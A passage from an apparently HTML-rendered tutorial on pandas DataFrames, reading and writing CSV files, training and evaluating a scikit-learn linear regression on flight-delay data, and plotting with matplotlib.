detailed information</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">airports.head(<span class="hljs-number">3</span>)<br><br>airports.tail(<span class="hljs-number">3</span>)<br><br>airports.shape<br><br>airports.info()<br></code></pre></td></tr></table></figure><h4 id="2）Query-a-DataFrame"><a href="#2）Query-a-DataFrame" class="headerlink" title="2）Query a DataFrame"></a>2）Query a DataFrame</h4><p><strong>Return specific rows or columns </strong></p><p>AKA slicing and dicing</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Request a single column</span><br>airports[<span class="hljs-string">&#x27;City&#x27;</span>]<br><br><span class="hljs-comment"># Request a list of columns</span><br>airports[[<span class="hljs-string">&#x27;Name&#x27;</span>, <span class="hljs-string">&#x27;Country&#x27;</span>]]<br><br><span class="hljs-comment"># iloc returns specific rows and columns by position</span><br><span class="hljs-comment"># Use the syntax iloc[rows, columns]  </span><br>airports.iloc[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br><span class="hljs-comment"># will return: Seattle-Tacoma</span><br>airports.iloc[<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><span class="hljs-comment"># will return: United Kingdom</span><br><br><span class="hljs-comment"># The range : returns all rows or columns</span><br>airports.iloc[:,:]<br><br><span class="hljs-comment"># You can request a range of rows or columns</span><br>airports.iloc[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>,:]<br><span class="hljs-comment"># returns first 2 rows and all columns</span><br>airports.iloc[:,<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br><span class="hljs-comment"># returns all rows and the first two columns</span><br><br><span class="hljs-comment"># Request a list of rows or columns</span><br>airports.iloc[:,[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>]]<br><span class="hljs-comment"># will return all rows and column 0 and column 2 (Name and Country)</span><br><br><span class="hljs-comment"># loc to specify items by name</span><br>airports.loc[:,[<span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;Country&#x27;</span>]]<br><span class="hljs-comment"># will return all rows and the columns Name and Country</span><br></code></pre></td></tr></table></figure><h4 id="3）Removing-and-splitting-DataFrame-columns"><a href="#3）Removing-and-splitting-DataFrame-columns" class="headerlink" title="3）Removing and splitting DataFrame columns"></a>3）Removing and splitting DataFrame columns</h4><ul><li><p>When preparing data for machine learning you may need to remove specific columns from the DataFrame</p></li><li><p>When preparing data for machine learning you may need to split the columns into separate DataFrames</p><ul><li>You might need to split quantitative and qualitative data into separate DataFrames</li></ul></li></ul><p><strong><code>drop</code> deletes columns from a DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Use drop to delete columns from a DataFrame</span><br><span class="hljs-comment"># DataFrameName.drop(columns=[&#x27;columnname&#x27;])</span><br>new_df = delays_df.drop(columns=[<span class="hljs-string">&#x27;Actual_arr_time&#x27;</span>]) <br><br><span class="hljs-comment"># Use inplace to edit the existing DataFrame</span><br><span class="hljs-comment"># will remove Actual_arr_time from the DataFrame delays_df</span><br>delays_df.drop(columns=[<span class="hljs-string">&#x27;Actual_arr_time&#x27;</span>], inplace=<span class="hljs-literal">True</span>) <br></code></pre></td></tr></table></figure><p><strong>Create a slice of the DataFrame and assign it to a new DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># will create a new DataFrame containing the specified slice</span><br>desc_df = delays_df.loc[:,[<span class="hljs-string">&#x27;Origin_airport&#x27;</span>,<span class="hljs-string">&#x27;Dest_airport&#x27;</span>]] <br></code></pre></td></tr></table></figure><h4 id="4）Handling-duplicates-and-rows-with-missing-values"><a href="#4）Handling-duplicates-and-rows-with-missing-values" class="headerlink" title="4）Handling duplicates and rows with missing values"></a>4）Handling duplicates and rows with missing values</h4><ul><li><p>Many models and procedures in data science will return an error if they analyze records with missing values</p></li><li><p>When you merge data from multiple sources you may get duplicate rows</p></li></ul><p><strong>Remove rows missing values</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Use info to check for missing values</span><br>delays_df.info()<br><br><span class="hljs-comment"># Use dropna to remove rows missing values</span><br><span class="hljs-comment"># Will create a new DataFrame without rows containing missing values</span><br>delay_no_nulls_df = delays_df.dropna()<br><br><span class="hljs-comment"># Specify inplace=True to update the existing DataFrame</span><br><span class="hljs-comment"># Will remove rows with missing values from the existing DataFrame</span><br>delays_df.dropna(inplace=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>Drop the duplicate rows</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># will return True if a row is a duplicate of a previous row</span><br>airports_df.duplicated()<br><br><span class="hljs-comment"># will drop the duplicate rows</span><br>airports_df.drop_duplicates(inplace=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="5、CSV"><a href="#5、CSV" class="headerlink" title="5、CSV"></a>5、CSV</h3><p><strong>Comma separated variable (CSV) files are a popular format for data files</strong></p><ul><li><p>Each row of the file contains one record</p></li><li><p>A special character such as a comma is used to separate column values</p></li><li><p>The first row may contain the names of the columns</p></li></ul><p><strong>Example: </strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Name,</span>City,Country<br>Seattle-Tacoma,Seattle,USA<br><span class="hljs-built_in">Dulles,</span>Washington,USA<br><span class="hljs-built_in">Heathrow,</span>London,United Kingdom<br><span class="hljs-built_in">Schiphol,</span>Amsterdam,Netherlands<br><span class="hljs-built_in">Changi,</span>Singapore,Singapore<br><span class="hljs-built_in">Pearson,</span>Toronto,Canada<br><span class="hljs-built_in">Narita,</span>Tokyo,Japan<br></code></pre></td></tr></table></figure><h4 id="1）Jupyter-notebooks"><a href="#1）Jupyter-notebooks" class="headerlink" title="1）Jupyter notebooks"></a>1）Jupyter notebooks</h4><p><strong>How does your notebook find the file?</strong></p><ul><li><p>You need to upload the files to Jupyter</p></li><li><p>It is common practice to create a subfolder to hold your data files</p></li><li><p>Create a folder for your data files by selecting <strong>New</strong> | <strong>Folder</strong> </p></li></ul><p><strong>Upload the file to access it from notebooks</strong></p><p>Navigate to the folder and upload the files you want to access from your notebooks by selecting <strong>Upload</strong></p><h4 id="2）Read-and-write-CSV-files-from-pandas-DataFrames"><a href="#2）Read-and-write-CSV-files-from-pandas-DataFrames" class="headerlink" title="2）Read and write CSV files from pandas DataFrames"></a>2）Read and write CSV files from pandas DataFrames</h4><p><strong>Read_csv loads a DataFrame from a CSV</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># read_csv loads a DataFrame from a CSV</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airports.csv&#x27;</span>)<br><br><span class="hljs-comment"># Rows with an extra, or other issues cause an error and the file does not load</span><br><span class="hljs-comment"># Specify error_bad_lines=False to skip rows with errors</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsInvalidRows.csv&#x27;</span>, error_bad_lines=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># If the first row does not contain column headers specify header=None</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsNoHeaderRows.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># Provide names for the columns with the names parameter</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsNoHeaderRows.csv&#x27;</span>, header=<span class="hljs-literal">None</span>, names=[<span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;City&#x27;</span>,<span class="hljs-string">&#x27;Country&#x27;</span>])<br><br><span class="hljs-comment"># Missing values appear as NaN</span><br>airports_df = pd.read_csv(<span class="hljs-string">&#x27;Data/airportsBlankValues.csv&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Use to_csv to write the contents of a DataFrame to a CSV file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Use to_csv to write the contents of a DataFrame to a CSV file</span><br>airports_df.to_csv(<span class="hljs-string">&#x27;Data/MyNewCSVFile.csv&#x27;</span>)<br><br><span class="hljs-comment"># Specify index=False if you do not want to include the index column</span><br>airports_df.to_csv(<span class="hljs-string">&#x27;Data/MyNewCSVFile.csv&#x27;</span>, index=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="6、Scikit-learn"><a href="#6、Scikit-learn" class="headerlink" title="6、Scikit-learn"></a>6、Scikit-learn</h3><p>Open source library for preprocessing data and model training</p><h4 id="1）Splitting-test-and-training-data-with-scikit-learn"><a href="#1）Splitting-test-and-training-data-with-scikit-learn" class="headerlink" title="1）Splitting test and training data with scikit-learn"></a>1）Splitting test and training data with scikit-learn</h4><p><strong>Machine learning 101</strong></p><p>Given X data, predict y value</p><ul><li><p>Given a customer, predict if they will by a product</p></li><li><p>Given a shopping cart, predict similar products</p></li><li><p>Given a flight, predict the chance it will be late</p></li></ul><p><strong>We need to split our data before creating a model</strong></p><p>Conventions: </p><ul><li><p>Put the data you want to predict (the label) in a DataFrame called y</p></li><li><p>Put the data that influence the label (the features) in a DataFrame called X</p></li></ul><p><strong>You may need to split your data into training and test data sets before you train your model</strong></p><ul><li><p><strong>train</strong> will be used to train the model</p></li><li><p><strong>test</strong> will be used to test the model </p></li><li><p>Typically put aside 20 to 30% of your records for testing</p></li></ul><pre><code class=" mermaid">graph LRA[DataFrame] --&gt; B[DataFrame X] --&gt; D[X_train]B[DataFrame X] --&gt; E[X_test]A --&gt; C[DataFrame y] --&gt; F[y_train]C[DataFrame y] --&gt; G[y_train]</code></pre><p><strong>Use <code>train_test_split</code> to split each of the X and y DataFrames into training and test DataFrames</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">y = delays_df.loc[:,[<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>]]<br>X = delays_df.loc[:,[<span class="hljs-string">&#x27;DISTANCE&#x27;</span>, <span class="hljs-string">&#x27;CRS_ELAPSED_TIME&#x27;</span>]]<br><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.3</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># X_train, X_test, y_train, y_test – names of DataFrames to create to store the training and test data</span><br><span class="hljs-comment"># X – name of the DataFrame containing your features</span><br><span class="hljs-comment"># y – name of the DataFrame containing your labels</span><br><span class="hljs-comment"># test_size – what portion of the rows to put into the test data frames</span><br><span class="hljs-comment"># random_state – sets the seed for random numbers - every time the code runs the same &quot;random&quot; sets of rows will be returned</span><br><br></code></pre></td></tr></table></figure><p><strong>DataFrame:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>0</td><td>1670</td><td>225</td><td>7</td></tr><tr><td>1</td><td>580</td><td>105</td><td>-4</td></tr><tr><td>2</td><td>425</td><td>96</td><td>5</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td></tr><tr><td>299645</td><td>1500</td><td>210</td><td>73</td></tr></tbody></table></div><p><strong>DataFrame X:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th></tr></thead><tbody><tr><td>0</td><td>1670</td><td>225</td></tr><tr><td>1</td><td>580</td><td>105</td></tr><tr><td>…</td><td>…</td><td>…</td></tr><tr><td>299645</td><td>1500</td><td>210</td></tr></tbody></table></div><p><strong>DataFrame y:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>0</td><td>7</td></tr><tr><td>1</td><td>-4</td></tr><tr><td>…</td><td>…</td></tr><tr><td>299645</td><td>74</td></tr></tbody></table></div><p><strong>X_train:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th></tr></thead><tbody><tr><td>0</td><td>1670</td><td>225</td></tr><tr><td>1</td><td>580</td><td>105</td></tr><tr><td>…</td><td>…</td><td>…</td></tr><tr><td>299645</td><td>1500</td><td>210</td></tr></tbody></table></div><p><strong>X_test:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>DISTANCE</strong></th><th><strong>CRS_ELAPSED_TIME</strong></th></tr></thead><tbody><tr><td>2</td><td>425</td><td>96</td></tr><tr><td>17</td><td>750</td><td>130</td></tr><tr><td>…</td><td>…</td><td>…</td></tr><tr><td>299643</td><td>425</td><td>100</td></tr></tbody></table></div><p><strong>y_train:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>0</td><td>7</td></tr><tr><td>1</td><td>-4</td></tr><tr><td>…</td><td>…</td></tr><tr><td>299645</td><td>74</td></tr></tbody></table></div><p><strong>y_test:</strong></p><div class="table-container"><table><thead><tr><th><strong>index</strong></th><th><strong>ARR_DELAY</strong></th></tr></thead><tbody><tr><td>2</td><td>5</td></tr><tr><td>17</td><td>-1</td></tr><tr><td>…</td><td>…</td></tr><tr><td>299645</td><td>11</td></tr></tbody></table></div><h4 id="2）Train-a-linear-regression-model-with-scikit-learn"><a href="#2）Train-a-linear-regression-model-with-scikit-learn" class="headerlink" title="2）Train a linear regression model with scikit-learn"></a>2）Train a linear regression model with scikit-learn</h4><p><strong>Once your data is prepared you can use it to train a model</strong></p><p><strong>There are different libraries and classes you can use to train a model</strong></p><ul><li><p>The <strong>scikit-learn</strong> library contains a number of different classes to train different types of models</p></li><li><p>The <strong>LinearRegression</strong> class fits a linear model</p></li><li><p>Call the <strong>fit</strong> method to fit your data to a linear model which can be used to predict the outcomes for new data</p></li></ul><p><strong>The code to train a model usually follows the same pattern</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import the desired class from the library</span><br><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression<br><br><span class="hljs-comment"># Create an instance of the class</span><br>regressor = LinearRegression()<br><br><span class="hljs-comment"># use the fit method to train the model using your training data</span><br>regressor.fit(X_train, y_train)<br></code></pre></td></tr></table></figure><h4 id="3）Testing-a-model"><a href="#3）Testing-a-model" class="headerlink" title="3）Testing a model"></a>3）Testing a model</h4><p>Predict values for the test data in X_test</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># predict returns the values the trained model predicts for new data</span><br>y_pred = regressor.predict(X_test)<br></code></pre></td></tr></table></figure><p>Compare the predicted values to the actual values in y_test to see how well your model performs</p><h4 id="4）Evaluating-accuracy-of-a-model-using-calculations"><a href="#4）Evaluating-accuracy-of-a-model-using-calculations" class="headerlink" title="4）Evaluating accuracy of a model using calculations"></a>4）Evaluating accuracy of a model using calculations</h4><p><strong>It’s impractical to visually compare predicted and actual values across thousands of rows</strong> </p><p>Instead we use standard calculations to get a sense of overall accuracy</p><p><strong>Mean Squared Error (MSE) is the average error</strong></p><ul><li><p>MSE = mean((actual – predicted)**2)</p></li><li><p>You could write a python function to loop through each row, and perform this calculation</p></li><li><p>OR You could use <strong>mean_squared_error</strong> from the <strong>scikit-learn</strong> library</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics<br><br>metrics.mean_squared_error(y_test, y_pred)<br></code></pre></td></tr></table></figure><p><strong>Root Mean Squared Error (RMSE) is the square root of the mean squared error</strong></p><ul><li><p>RMSE = √MSE</p></li><li><p><strong>scikit-learn</strong> doesn’t have a method for RMSE but</p><ul><li><p><strong>scikit-learn</strong> has the mean_squared_error method to calculate MSE</p></li><li><p><strong>numpy</strong> has a sqrt method to calculate square root </p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>np.sqrt(metrics.mean_squared_error(y_test, y_pred))<br></code></pre></td></tr></table></figure><p><strong>Different models have different metrics to measure accuracy</strong></p><ul><li><p><strong>numpy</strong> provides standard mathematical functions </p></li><li><p><strong>scikit-learn</strong> provides a number of functions for assessing prediction error</p></li><li><p>Together they allow us to measure model accuracy</p></li></ul><h3 id="7、numpy-vs-pandas"><a href="#7、numpy-vs-pandas" class="headerlink" title="7、numpy vs pandas"></a>7、numpy vs pandas</h3><p><strong>Let’s take a closer look at our predictions</strong></p><p>When we predicted values using our trained model the results were returned into an object called y_pred</p><p><code>y_pred = regressor.predict(X_test)</code></p><p>We compared the values in y_test to y_pred to see how accurately our model predicted arrival delays</p><p><strong>Keep an eye on the datatypes</strong></p><p><strong>y_pred</strong> is not a <strong>pandas DataFrame</strong>. It is a <strong>numpy array</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># You can use type() to check the type of any python object</span><br><span class="hljs-built_in">type</span>(y_pred)<br><span class="hljs-comment"># returns numpy.ndarray</span><br><br><span class="hljs-built_in">type</span>(y_test)<br><span class="hljs-comment"># returns pandas.core.frame.DataFrame</span><br></code></pre></td></tr></table></figure><p><strong>numpy is a python package for scientific computing</strong></p><ul><li><p>numpy has an assortment of classes and methods to help with calculations.</p></li><li><p>When you use python for data science you use a mix of pandas and numpy objects and methods</p></li></ul><p><strong>A one dimensional numpy array is similar to a pandas Series</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">airports_array = np.array([<span class="hljs-string">&#x27;Pearson&#x27;</span>, <span class="hljs-string">&#x27;Changi&#x27;</span>, <span class="hljs-string">&#x27;Narita&#x27;</span>])<br><span class="hljs-built_in">print</span>(airports_array)<br><span class="hljs-built_in">print</span>(airports_array[<span class="hljs-number">2</span>])<br><span class="hljs-comment"># returns</span><br><span class="hljs-comment"># [&#x27;Pearson&#x27; &#x27;Changi&#x27; &#x27;Narita&#x27;] </span><br><span class="hljs-comment"># Narita</span><br><br><br>airports_series = pd.Series([<span class="hljs-string">&#x27;Pearson&#x27;</span>,<span class="hljs-string">&#x27;Changi&#x27;</span>, <span class="hljs-string">&#x27;Narita&#x27;</span>])<br><span class="hljs-built_in">print</span>(airports_series)<br><span class="hljs-built_in">print</span>(airports_series[<span class="hljs-number">2</span>])<br><span class="hljs-comment"># returns </span><br><span class="hljs-comment"># 0 Pearson</span><br><span class="hljs-comment"># 1 Changi </span><br><span class="hljs-comment"># 2 Narita </span><br><span class="hljs-comment"># Narita</span><br></code></pre></td></tr></table></figure><p><strong>A two dimensional numpy array is similar to a pandas DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">airports_array = np.array([[<span class="hljs-string">&#x27;YYZ&#x27;</span>,<span class="hljs-string">&#x27;Pearson&#x27;</span>], [<span class="hljs-string">&#x27;SIN&#x27;</span>,<span class="hljs-string">&#x27;Changi&#x27;</span>], [<span class="hljs-string">&#x27;NRT&#x27;</span>,<span class="hljs-string">&#x27;Narita&#x27;</span>]])<br><span class="hljs-built_in">print</span>(airports_array)<br><span class="hljs-built_in">print</span>(airports_array[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]) <br><span class="hljs-comment"># returns</span><br><span class="hljs-comment"># [[&#x27;YYZ&#x27; &#x27;Pearson&#x27;]</span><br><span class="hljs-comment">#  [&#x27;SIN&#x27; &#x27;Changi&#x27;]</span><br><span class="hljs-comment">#  [&#x27;NRT&#x27; &#x27;Narita&#x27;]] </span><br><span class="hljs-comment"># YYZ </span><br><br><br>airports_df = pd.DataFrame([[<span class="hljs-string">&#x27;YYZ&#x27;</span>,<span class="hljs-string">&#x27;Pearson&#x27;</span>], [<span class="hljs-string">&#x27;SIN&#x27;</span>,<span class="hljs-string">&#x27;Changi&#x27;</span>], [<span class="hljs-string">&#x27;NRT&#x27;</span>,<span class="hljs-string">&#x27;Narita&#x27;</span>]])<br><span class="hljs-built_in">print</span>(airports_df)<br><span class="hljs-built_in">print</span>(airports_df.iloc[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])<br><span class="hljs-comment"># returns </span><br><span class="hljs-comment">#   0   1 </span><br><span class="hljs-comment"># 0 YYZ Pearson </span><br><span class="hljs-comment"># 1 SIN Changi </span><br><span class="hljs-comment"># 2 NRT Narita</span><br><span class="hljs-comment"># YYZ </span><br></code></pre></td></tr></table></figure><p><strong>You can move data between numpy and pandas objects</strong></p><p>If you want your predicted values in a <strong>pandas DataFrame</strong> instead of a <strong>numpy array</strong>, you can use the <strong>pandas DataFrame</strong> <strong>constructor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">y_pred_df = pd.DataFrame(y_pred)<br><br><span class="hljs-built_in">type</span>(y_pred)<br><span class="hljs-comment"># Returns numpy.ndarray</span><br><span class="hljs-built_in">type</span>(y_pred_df)<br><span class="hljs-comment"># Returns pandas.core.frame.DataFrame</span><br></code></pre></td></tr></table></figure><h3 id="8、Visualizing-Data-with-Matplotlib"><a href="#8、Visualizing-Data-with-Matplotlib" class="headerlink" title="8、Visualizing Data with Matplotlib"></a>8、Visualizing Data with Matplotlib</h3><p><strong>Checking for correlation with visualization</strong></p><ul><li><p>Scatterplots</p><ul><li><p>Common chart type</p></li><li><p>A dot is drawn for each intersection of X and Y</p></li></ul></li><li><p>Useful for checking for correlation between columns of data</p><ul><li>There is correlation when a change in one column is bound to the value of another column </li></ul></li><li><p>Examples</p><ul><li><p>A correlation exists between number of car accidents on a given day and the amount of snowfall </p></li><li><p>No correlation exists between amount of snowfall on a given day and the Microsoft stock price</p></li></ul></li></ul><p><strong>Scatterplot examples</strong></p><p><strong>Using matplotlib to draw graphs</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Import the library</span><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># Create plots directly from the DataFrame</span><br>delays_df = pd.read_csv(<span class="hljs-string">&#x27;Data/Lots_of_flight_data.csv&#x27;</span>) <br>delays_df.plot(kind=<span class="hljs-string">&#x27;scatter&#x27;</span>, x=<span class="hljs-string">&#x27;DISTANCE&#x27;</span>, y=<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>, color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.3</span>,<br>               title=<span class="hljs-string">&#x27;Correlation arrival and distance&#x27;</span>)<br>plt.show()<br><br>delays_df.plot(kind=<span class="hljs-string">&#x27;scatter&#x27;</span>, x=<span class="hljs-string">&#x27;DEP_DELAY&#x27;</span>, y=<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>, color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.3</span>,<br>               title=<span class="hljs-string">&#x27;Correlation of arrival and departure delay&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.xlabel(<span class="hljs-string">&#x27;Departure delay (minutes)&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Arrival delay (minutes)&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;Correlation Departure and Arrival Delay&#x27;</span>)<br>plt.scatter(x=delays_df[<span class="hljs-string">&#x27;DEP_DELAY&#x27;</span>], y=delays_df[<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>], color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.3</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><strong>You can draw a line graph to show the predicted values of a trained model</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.xlabel(<span class="hljs-string">&#x27;Departure delay (minutes)&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Arrival delay (minutes)&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;Predicted Arrival delays&#x27;</span>)<br>plt.plot(X_test, y_pred, color=<span class="hljs-string">&#x27;red&#x27;</span>, linewidth=<span class="hljs-number">2</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><strong>Overlay the model on our data</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.xlabel(<span class="hljs-string">&#x27;Deparure delay&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Arrival 